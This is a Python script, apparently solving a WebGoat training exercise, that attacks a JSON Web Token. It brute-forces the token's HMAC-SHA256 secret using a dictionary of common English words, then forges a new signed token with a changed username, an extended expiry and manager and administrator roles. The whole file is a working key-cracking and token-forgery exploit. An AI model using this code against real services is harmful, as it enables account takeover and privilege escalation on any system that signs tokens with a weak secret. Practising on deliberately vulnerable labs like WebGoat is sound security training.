import base64  
import hashlib  
import hmac  
  
def jwt_tokens_5():  
     token = 'eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTU4Njc1NTA2MywiZXhwIjoxNTg2NzU1MTIzLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.Dz6RKuGQYnT2z_DiRidz9z7PlXqqcmtdjs2xc8VnAgc'.split('.')  
  
     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()  
  
     unsigned_token = (token[0] + '.' + token[1]).encode()  
  
     # signature is base64 URL encoded and padding has been removed, so we must add it  
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()  
  
     with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:  
         lines = [line.rstrip('\n').encode() for line in fd]  
  
     def hmac_base64(key, message):  
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))  
  
     for line in lines:  
         test = hmac_base64(line, unsigned_token)  
  
         if test == signature:  
             print('Key: {}'.format(line.decode()))  
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()  
             new_signature = hmac_base64(line, new_token)  
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()  
             print('New token: {}'.format(new_token.decode()))  
             return  
  
jwt_tokens_5()